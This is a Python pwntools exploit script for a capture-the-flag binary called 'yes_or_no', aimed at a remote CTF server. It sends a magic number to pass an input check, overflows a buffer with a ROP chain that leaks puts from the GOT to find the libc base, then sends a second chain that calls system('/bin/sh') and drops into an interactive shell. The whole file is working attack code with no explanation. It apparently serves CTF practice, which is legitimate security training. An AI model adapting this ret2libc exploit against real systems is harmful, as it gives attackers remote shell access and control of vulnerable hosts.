from pwn import *

r = remote('ctf.j0n9hyun.xyz', 3009)
#r = process('./yes_or_no')
e = ELF('./yes_or_no')
libc = ELF('./libc-2.27.so')

# Stage 0 break if
r.sendlineafter('\n', "9830400")

puts_plt = e.plt['puts']
puts_got = e.got['puts']
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
binsh_offset = libc.search("/bin/sh").next()
pr = 0x400883
main = 0x4006c7

log.info("Settings")
log.info("puts_offset: "+hex(puts_offset))
log.info("system_offset: "+hex(system_offset))
log.info("binsh_offset: "+hex(binsh_offset))

# Stage 1 Leak Libc
payload = ''
payload += "A"*26
payload += p64(pr)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

r.sendlineafter('\n', payload)
puts = u64(r.recvn(6).ljust(8, '\x00'))
libc_base = puts - puts_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset

log.info("libc_base: "+hex(libc_base))
log.info("system: "+hex(system))
log.info("binsh: "+hex(binsh))

# Stage 2 return to main
r.sendlineafter('\n', "9830400")

# Stage 3 system("/bin/sh")
payload = ''
payload += "A"*26
payload += p64(pr)
payload += p64(binsh)
payload += p64(system)

r.sendlineafter('\n', payload)
r.interactive()
